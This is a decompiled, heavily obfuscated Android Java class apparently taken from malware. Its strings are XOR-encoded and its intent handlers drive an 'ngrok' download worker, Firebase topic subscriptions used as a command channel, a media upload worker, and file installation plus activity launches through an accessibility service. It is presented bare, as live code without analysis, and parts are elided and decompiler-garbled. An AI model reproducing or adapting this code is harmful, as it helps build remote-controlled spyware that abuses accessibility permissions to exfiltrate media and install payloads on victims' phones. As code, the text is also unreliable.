package com.mistral.jon;

import android.app.IntentService;
import android.app.PendingIntent;
import android.content.Intent;
import com.google.firebase.messaging.FirebaseMessaging;
import com.mistral.jon.activity.ScpActivity;
import com.mistral.jon.ngrok.DownloadWorker;
import com.mistral.jon.services.a11y.AcService;
import com.mistral.jon.workers.MediaUploadWorker;
import java.io.File;
import z.ajo;
import z.bco;
import z.bcv;

public class MyIntentService extends IntentService implements bco {
    private static long[] a = null;
    private static final String m = "MyIntentService";

    static {
        long[] arr_v = new long[0x8B];
        MyIntentService.a = arr_v;
        arr_v[0] = 0x101B953CL;
        arr_v[1] = 0x358049D7L;
        arr_v[2] = 0xFFFFFFFF9D4EE7C3L;
        arr_v[3] = 120683405L;
        arr_v[4] = 0xFFFFFFFFB09122F8L;
        arr_v[5] = 0x2488AC1DL;
        arr_v[6] = 0xFFFFFFFFC60942B3L;
        arr_v[7] = 0x37C02D2L;
        arr_v[8] = 0xFFFFFFFFB0E4075BL;
        arr_v[9] = -1641407031L;
        arr_v[10] = 0x7C5F2CFEL;
        arr_v[11] = 0x2FC001CL;
        arr_v[12] = -1051320674L;
        arr_v[13] = 0x6CF7CEA3L;
        arr_v[14] = 0xFFFFFFFFBCDA40E8L;
        arr_v[15] = 566566092L;
        arr_v[16] = 0x12C05B3CL;
        arr_v[17] = 0x22B23B5FL;
        arr_v[18] = 0xC80003FL;
        arr_v[19] = 0xFFFFFFFFD7927D92L;
        arr_v[20] = 19203690L;
        arr_v[21] = 0xFFFFFFFFF214A769L;
        arr_v[22] = 2012112777L;
        arr_v[23] = 0x6AC77AAL;
        arr_v[24] = 0x61E4DAA9L;
        arr_v[25] = 0x2A8E877L;
        arr_v[26] = 0x69CAA0EEL;
        arr_v[27] = 2089970539L;
        arr_v[28] = 1547000463L;
        arr_v[29] = 0x7019F907L;
        arr_v[30] = 0x566C009CL;
        arr_v[0x1F] = 1369660470L;
        arr_v[0x20] = 2042361030L;
        arr_v[33] = 0x185FC0E6L;
        arr_v[34] = 920840917L;
        arr_v[35] = 2054308825L;
        arr_v[36] = 0x3A1F1A9BL;
        arr_v[37] = 1093057411L;
        arr_v[38] = 0x695606B0L;
        arr_v[39] = 0x6A6BB7F1L;
        arr_v[40] = 0x6A2BD2A9L;
        arr_v[41] = 0x37C9DB25L;
        arr_v[42] = 1100500554L;
        arr_v[43] = 0x49E79A2FL;
        arr_v[44] = 110329574L;
        arr_v[45] = 0x594C33B7L;
        arr_v[46] = 0x39BD0E59L;
        arr_v[0x2F] = 0x1BFD5AB1L;
        arr_v[0x30] = 0x7570DF99L;
        arr_v[49] = 1720854867L;
        arr_v[50] = 0x2E5F1F3AL;
        arr_v[51] = 1637078855L;
        arr_v[52] = 0x18805615L;
        arr_v[53] = 0x2689D062L;
        arr_v[54] = 0x6922BA49L;
        arr_v[55] = 0x75D9F27L;
        arr_v[56] = 0xB66A195L;
        arr_v[57] = 0x4B02C13EL;
        arr_v[58] = -2043505015L;
        arr_v[59] = 0xFFFFFFFFAB7C0C90L;
        arr_v[60] = 111305837L;
        arr_v[61] = 0x6C7055EAL;
        arr_v[62] = 0xFFFFFFFFCEBA4B02L;
        arr_v[0x3F] = 0x34E7328L;
        arr_v[0x40] = 0xFFFFFFFFFC081E1EL;
        arr_v[65] = 0x955CB90L;
        arr_v[66] = 0x6A0450BAL;
        arr_v[67] = 700128296L;
        arr_v[68] = -560696405L;
        arr_v[69] = -239764405L;
        arr_v[70] = 0xFFFFFFFF86E54FBEL;
        arr_v[71] = 0xFFFFFFFFAAA63058L;
        arr_v[72] = 0x4B5713B3L;
        arr_v[73] = 0x73FD1CC2L;
        arr_v[74] = 0x7E0EF6C2L;
        arr_v[75] = 0x4D783A1CL;
        arr_v[76] = 0x2DEDBF18L;
        arr_v[77] = 0x33FEDD38L;
        arr_v[78] = 0x448B7454L;
        arr_v[0x4F] = 0x5C5E960AL;
        arr_v[80] = 0x5C00F1EL;
        arr_v[81] = 0xFFFFFFFFE7F28FDEL;
        arr_v[82] = -1096804284L;
        arr_v[83] = 1907057868L;
        arr_v[84] = 0xFFFFFFFF9D644C5AL;
        arr_v[85] = 0xFFFFFFFF97586102L;
        arr_v[86] = 0x7EB4EC11L;
        arr_v[87] = 0xFFFFFFFFBB9C2ADBL;
        arr_v[88] = 0xFFFFFFFFB85BF7FEL;
        arr_v[89] = 0x679A54BEL;
        arr_v[90] = 0x25B612DEL;
        arr_v[91] = 212875400L;
        arr_v[92] = 0xFD068FDL;
        arr_v[93] = 0x547DD754L;
        arr_v[94] = 2088584792L;
        arr_v[0x5F] = 790066615L;
        arr_v[0x60] = 0x5A40D416L;
        arr_v[97] = 0xFFFFFFFFAF90481BL;
        arr_v[98] = 0x25D246F5L;
        arr_v[99] = 0xFFFFFFFFECFDE39BL;
        arr_v[100] = 0xFFFFFFFFB4D19545L;
        arr_v[101] = 0x6A54ACC2L;
        arr_v[102] = -393941070L;
        arr_v[103] = 0xFFFFFFFF9C02AFC6L;
        arr_v[104] = 600078479L;
        arr_v[105] = 0x4E361DECL;
        arr_v[106] = 2005285356L;
        arr_v[107] = 0xA3F663EL;
        arr_v[108] = 0x6607E696L;
        arr_v[109] = 0x4B81C6BFL;
        arr_v[110] = 0x6746674BL;
        arr_v[0x6F] = 0x16F3AA8BL;
        arr_v[0x70] = 0xFFFFFFFFD2C20408L;
        arr_v[0x71] = -2075034323L;
        arr_v[0x72] = 2076579355L;
        arr_v[0x73] = 0xFFFFFFFFD68F8FF9L;
        arr_v[0x74] = 0xFFFFFFFF93DF7EC9L;
        arr_v[0x75] = -1135600305L;
        arr_v[0x76] = -1768760485L;
        arr_v[0x77] = 0x23521CBCL;
        arr_v[120] = -1740407585L;
        arr_v[0x79] = 0x7F52DF9FL;
        arr_v[0x7A] = -1736806781L;
        arr_v[0x7B] = 0xFFFFFFFF9BD87031L;
        arr_v[0x7C] = 0x6139F5BBL;
        arr_v[0x7D] = 280530389L;
        arr_v[0x7E] = -1449336083L;
        arr_v[0x7F] = 0x3D87DD40L;
        arr_v[0x80] = -1025357619L;
        arr_v[0x81] = -206068604L;
        arr_v[130] = 0x50498A3FL;
        arr_v[0x83] = 2075064014L;
        arr_v[0x84] = 0x70FC8038L;
        arr_v[0x85] = 0x314208E4L;
        arr_v[0x86] = 0x73E75F61L;
        arr_v[0x87] = 348027158L;
        arr_v[0x88] = 674000842L;
        arr_v[0x89] = 0x1301FE6L;
        arr_v[0x8A] = 0x5B772E4BL;
    }

    public MyIntentService() {
        long[] arr_v = MyIntentService.a;
        byte[] arr_b = new byte[((int)arr_v[0]) ^ 270243100];
        arr_b[((int)arr_v[1]) ^ 0x358049D7] = ((int)arr_v[2]) ^ 0x62B1184D;
        arr_b[((int)arr_v[3]) ^ 120683404] = ((int)arr_v[4]) ^ 0x4F6EDD4B;
        arr_b[((int)arr_v[5]) ^ 0x2488AC1F] = ((int)arr_v[6]) ^ 0x39F6BD60;
        arr_b[((int)arr_v[7]) ^ 0x37C02D1] = ((int)arr_v[8]) ^ 0x4F1BF895;
        arr_b[4] = ((int)arr_v[9]) ^ 0x61D5E200;
        arr_b[5] = ((int)arr_v[10]) ^ 0x7C5F2CA1;
        arr_b[((int)arr_v[11]) ^ 0x2FC001A] = ((int)arr_v[12]) ^ 1051320669;
        arr_b[((int)arr_v[13]) ^ 0x6CF7CEA4] = ((int)arr_v[14]) ^ 0x4325BF37;
        arr_b[((int)arr_v[15]) ^ 566566084] = ((int)arr_v[16]) ^ 0x12C05B33;
        arr_b[((int)arr_v[17]) ^ 582105942] = ((int)arr_v[3]) ^ 120683404;
        arr_b[((int)arr_v[18]) ^ 0xC800035] = ((int)arr_v[19]) ^ 0x286D8228;
        arr_b[((int)arr_v[20]) ^ 0x1250661] = ((int)arr_v[21]) ^ 0xDEB58A5;
        arr_b[((int)arr_v[22]) ^ 2012112773] = ((int)arr_v[23]) ^ 0x6AC77D6;
        arr_b[((int)arr_v[24]) ^ 0x61E4DAA4] = ((int)arr_v[25]) ^ 0x2A8E832;
        arr_b[((int)arr_v[26]) ^ 0x69CAA0E0] = ((int)arr_v[27]) ^ 2089970545;
        arr_b[((int)arr_v[16]) ^ 0x12C05B33] = ((int)arr_v[28]) ^ 1547000568;
        arr_b[((int)arr_v[29]) ^ 0x7019F917] = ((int)arr_v[30]) ^ 0x566C00F9;
        arr_b[((int)arr_v[0x1F]) ^ 1369660455] = ((int)arr_v[0x20]) ^ 2042360972;
        arr_b[((int)arr_v[33]) ^ 0x185FC0F4] = ((int)arr_v[34]) ^ 920840889;
        arr_b[((int)arr_v[35]) ^ 2054308810] = ((int)arr_v[36]) ^ 0x3A1F1AD5;
        arr_b[((int)arr_v[37]) ^ 1093057431] = ((int)arr_v[25]) ^ 0x2A8E832;
        arr_b[((int)arr_v[38]) ^ 0x695606A5] = ((int)arr_v[39]) ^ 0x6A6BB790;
        arr_b[((int)arr_v[40]) ^ 0x6A2BD2BF] = ((int)arr_v[41]) ^ 0x37C9DB47;
        arr_b[((int)arr_v[42]) ^ 1100500573] = ((int)arr_v[43]) ^ 1239915108;
        arr_b[((int)arr_v[44]) ^ 0x6937EFE] = ((int)arr_v[30]) ^ 0x566C00F9;
        arr_b[((int)arr_v[45]) ^ 1498166190] = ((int)arr_v[46]) ^ 0x39BD0E3E;
        arr_b[((int)arr_v[27]) ^ 2089970545] = ((int)arr_v[0x2F]) ^ 0x1BFD5AE6;
        arr_b[((int)arr_v[0x30]) ^ 0x7570DF82] = ((int)arr_v[49]) ^ 1720854880;
        arr_b[((int)arr_v[50]) ^ 0x2E5F1F26] = ((int)arr_v[51]) ^ 1637078790;
        arr_b[((int)arr_v[52]) ^ 0x18805608] = ((int)arr_v[53]) ^ 0x2689D00C;
        arr_b[((int)arr_v[54]) ^ 1763883607] = ((int)arr_v[25]) ^ 0x2A8E832;
        arr_b[((int)arr_v[55]) ^ 0x75D9F38] = ((int)arr_v[56]) ^ 0xB66A1CD;
        super("MyIntentService");
    }

    // Detected as a lambda implementation
    private static void a(String s, ajo ajo0) [...]

    @Override  // android.app.IntentService
    protected void onHandleIntent(Intent intent0) {
        if(intent0 != null) {
            String s = intent0.getAction();
            if(MyIntentService.a.equals(s)) {
                DownloadWorker.a(this, intent0.getStringExtra(MyIntentService.g), intent0.getStringExtra(MyIntentService.h), intent0.getBooleanExtra(MyIntentService.i, ((boolean)(0x358049D7 ^ ((int)MyIntentService.a[1])))));
                return;
            }
            if(MyIntentService.b.equals(s)) {
                String s1 = intent0.getStringExtra(MyIntentService.j);
                FirebaseMessaging.a().a(s1).a((ajo ajo0) -> {
                    StringBuilder stringBuilder0 = new StringBuilder();
                    long[] arr_v = MyIntentService.a;
                    byte[] arr_b = new byte[((int)arr_v[0]) ^ 270243100];
                    arr_b[((int)arr_v[1]) ^ 0x358049D7] = ((int)arr_v[58]) ^ 2043505012;
                    arr_b[((int)arr_v[3]) ^ 120683404] = ((int)arr_v[59]) ^ 0x5483F354;
                    arr_b[((int)arr_v[5]) ^ 0x2488AC1F] = ((int)arr_v[60]) ^ 111305821;
                    arr_b[((int)arr_v[7]) ^ 0x37C02D1] = ((int)arr_v[61]) ^ 0x6C7055CE;
                    arr_b[4] = ((int)arr_v[62]) ^ 0x3145B4A9;
                    arr_b[5] = ((int)arr_v[0x3F]) ^ 0x34E730E;
                    arr_b[((int)arr_v[11]) ^ 0x2FC001A] = ((int)arr_v[0x40]) ^ 0x3F7E18A;
                    arr_b[((int)arr_v[13]) ^ 0x6CF7CEA4] = ((int)arr_v[61]) ^ 0x6C7055CE;
                    arr_b[((int)arr_v[15]) ^ 566566084] = ((int)arr_v[65]) ^ 156617705;
                    arr_b[((int)arr_v[17]) ^ 582105942] = ((int)arr_v[66]) ^ 0x6A0450E8;
                    arr_b[((int)arr_v[18]) ^ 0xC800035] = ((int)arr_v[61]) ^ 0x6C7055CE;
                    arr_b[((int)arr_v[20]) ^ 0x1250661] = ((int)arr_v[67]) ^ 700128269;
                    arr_b[((int)arr_v[22]) ^ 2012112773] = ((int)arr_v[68]) ^ 560696441;
                    arr_b[((int)arr_v[24]) ^ 0x61E4DAA4] = ((int)arr_v[69]) ^ 239764409;
                    arr_b[((int)arr_v[26]) ^ 0x69CAA0E0] = ((int)arr_v[70]) ^ 2031792206;
                    arr_b[((int)arr_v[16]) ^ 0x12C05B33] = ((int)arr_v[71]) ^ 0x5559CFA9;
                    arr_b[((int)arr_v[29]) ^ 0x7019F917] = ((int)arr_v[65]) ^ 156617705;
                    arr_b[((int)arr_v[0x1F]) ^ 1369660455] = ((int)arr_v[72]) ^ 0x4B5713D7;
                    arr_b[((int)arr_v[33]) ^ 0x185FC0F4] = ((int)arr_v[73]) ^ 0x73FD1CB4;
                    arr_b[((int)arr_v[35]) ^ 2054308810] = ((int)arr_v[0x20]) ^ 2042360972;
                    arr_b[((int)arr_v[37]) ^ 1093057431] = ((int)arr_v[72]) ^ 0x4B5713D7;
                    arr_b[((int)arr_v[38]) ^ 0x695606A5] = ((int)arr_v[72]) ^ 0x4B5713D7;
                    arr_b[((int)arr_v[40]) ^ 0x6A2BD2BF] = ((int)arr_v[74]) ^ 0x7E0EF6A4;
                    arr_b[((int)arr_v[42]) ^ 1100500573] = ((int)arr_v[75]) ^ 1299724870;
                    arr_b[((int)arr_v[44]) ^ 0x6937EFE] = ((int)arr_v[76]) ^ 0x2DEDBF29;
                    arr_b[((int)arr_v[45]) ^ 1498166190] = ((int)arr_v[77]) ^ 0x33FEDD7E;
                    arr_b[((int)arr_v[27]) ^ 2089970545] = ((int)arr_v[46]) ^ 0x39BD0E3E;
                    arr_b[((int)arr_v[0x30]) ^ 0x7570DF82] = ((int)arr_v[78]) ^ 0x448B7400;
                    arr_b[((int)arr_v[50]) ^ 0x2E5F1F26] = ((int)arr_v[30]) ^ 0x566C00F9;
                    arr_b[((int)arr_v[52]) ^ 0x18805608] = ((int)arr_v[0x4F]) ^ 1549702728;
                    arr_b[((int)arr_v[54]) ^ 1763883607] = ((int)arr_v[56]) ^ 0xB66A1CD;
                    arr_b[((int)arr_v[55]) ^ 0x75D9F38] = ((int)arr_v[39]) ^ 0x6A6BB790;
                    StringBuilder stringBuilder1 = stringBuilder0.append("Topic ").append(s1);
                    long[] arr_v1 = MyIntentService.a;
                    byte[] arr_b1 = new byte[((int)arr_v1[0]) ^ 270243100];
                    arr_b1[((int)arr_v1[1]) ^ 0x358049D7] = ((int)arr_v1[80]) ^ 0x5C00F40;
                    arr_b1[((int)arr_v1[3]) ^ 120683404] = ((int)arr_v1[81]) ^ 0x180D707C;
                    arr_b1[((int)arr_v1[5]) ^ 0x2488AC1F] = ((int)arr_v1[36]) ^ 0x3A1F1AD5;
                    arr_b1[((int)arr_v1[7]) ^ 0x37C02D1] = ((int)arr_v1[52]) ^ 0x18805608;
                    arr_b1[4] = ((int)arr_v1[82]) ^ 1096804236;
                    arr_b1[5] = ((int)arr_v1[83]) ^ 1907057842;
                    arr_b1[((int)arr_v1[11]) ^ 0x2FC001A] = ((int)arr_v1[84]) ^ 0x629BB3CA;
                    arr_b1[((int)arr_v1[13]) ^ 0x6CF7CEA4] = ((int)arr_v1[85]) ^ 0x68A79EF6;
                    arr_b1[((int)arr_v1[15]) ^ 566566084] = ((int)arr_v1[21]) ^ 0xDEB58A5;
                    arr_b1[((int)arr_v1[17]) ^ 582105942] = ((int)arr_v1[86]) ^ 2125786206;
                    arr_b1[((int)arr_v1[18]) ^ 0xC800035] = ((int)arr_v1[12]) ^ 1051320669;
                    arr_b1[((int)arr_v1[20]) ^ 0x1250661] = ((int)arr_v1[87]) ^ 0x4463D55E;
                    arr_b1[((int)arr_v1[22]) ^ 2012112773] = ((int)arr_v1[88]) ^ 0x47A40805;
                    arr_b1[((int)arr_v1[24]) ^ 0x61E4DAA4] = ((int)arr_v1[52]) ^ 0x18805608;
                    arr_b1[((int)arr_v1[26]) ^ 0x69CAA0E0] = ((int)arr_v1[89]) ^ 0x679A54E8;
                    arr_b1[((int)arr_v1[16]) ^ 0x12C05B33] = ((int)arr_v1[15]) ^ 566566084;
                    arr_b1[((int)arr_v1[29]) ^ 0x7019F917] = ((int)arr_v1[90]) ^ 0x25B61287;
                    arr_b1[((int)arr_v1[0x1F]) ^ 1369660455] = ((int)arr_v1[91]) ^ 0xCB038DB;
                    arr_b1[((int)arr_v1[33]) ^ 0x185FC0F4] = ((int)arr_v1[92]) ^ 0xFD0688F;
                    arr_b1[((int)arr_v1[35]) ^ 2054308810] = ((int)arr_v1[46]) ^ 0x39BD0E3E;
                    arr_b1[((int)arr_v1[37]) ^ 1093057431] = ((int)arr_v1[56]) ^ 0xB66A1CD;
                    arr_b1[((int)arr_v1[38]) ^ 0x695606A5] = ((int)arr_v1[73]) ^ 0x73FD1CB4;
                    arr_b1[((int)arr_v1[40]) ^ 0x6A2BD2BF] = ((int)arr_v1[93]) ^ 0x547DD766;
                    arr_b1[((int)arr_v1[42]) ^ 1100500573] = ((int)arr_v1[94]) ^ 2088584744;
                    arr_b1[((int)arr_v1[44]) ^ 0x6937EFE] = ((int)arr_v1[65]) ^ 156617705;
                    arr_b1[((int)arr_v1[45]) ^ 1498166190] = ((int)arr_v1[78]) ^ 0x448B7400;
                    arr_b1[((int)arr_v1[27]) ^ 2089970545] = ((int)arr_v1[0x5F]) ^ 790066654;
                    arr_b1[((int)arr_v1[0x30]) ^ 0x7570DF82] = ((int)arr_v1[46]) ^ 0x39BD0E3E;
                    arr_b1[((int)arr_v1[50]) ^ 0x2E5F1F26] = ((int)arr_v1[0x60]) ^ 0x5A40D45A;
                    arr_b1[((int)arr_v1[52]) ^ 0x18805608] = ((int)arr_v1[93]) ^ 0x547DD766;
                    arr_b1[((int)arr_v1[54]) ^ 1763883607] = ((int)arr_v1[56]) ^ 0xB66A1CD;
                    arr_b1[((int)arr_v1[55]) ^ 0x75D9F38] = ((int)arr_v1[39]) ^ 0x6A6BB790;
                    stringBuilder1.append(" subscribed").toString();
                    if(!ajo0.b()) {
                        new StringBuilder().append("Topic ").append(s1).append("subscribe failed").toString();
                    }
                });
                return;
            }
            if(MyIntentService.c.equals(s)) {
                MediaUploadWorker.a(intent0.getStringExtra(MyIntentService.k), intent0.getStringExtra(MyIntentService.l));
                return;
            }
            if(MyIntentService.d.equals(s)) {
                try {
                    Intent intent1 = new Intent(AcService.a, ScpActivity.class);
                    intent1.addFlags(((int)MyIntentService.a[57]) ^ 0x5B02C13E);
                    AcService.a.startActivity(intent1);
                }
                catch(Exception exception0) {
                    exception0.printStackTrace();
                }
                return;
            }
            if(MyIntentService.e.equals(s)) {
                try {
                    Intent intent2 = new Intent(AcService.a, MyIntentService.class);
                    intent2.setAction("530be150-f0fe-4dd3-8baf-cb7dd11ec204");
                    PendingIntent pendingIntent0 = PendingIntent.getService(AcService.a, ((int)MyIntentService.a[1]) ^ 0x358049D7, intent2, 0x358049D7 ^ ((int)MyIntentService.a[1]));
                    String s2 = intent0.getStringExtra(MyIntentService.k);
                    new bcv(AcService.a).a(new File(s2), pendingIntent0);
                }
                catch(Exception exception0) {
                    exception0.printStackTrace();
                }
                return;
            }
            if("530be150-f0fe-4dd3-8baf-cb7dd11ec204".equals(s)) {
                try {
                    new bcv(AcService.a).a(intent0);
                }
                catch(Exception exception0) {
                    exception0.printStackTrace();
                }
            }
        }
    }
}

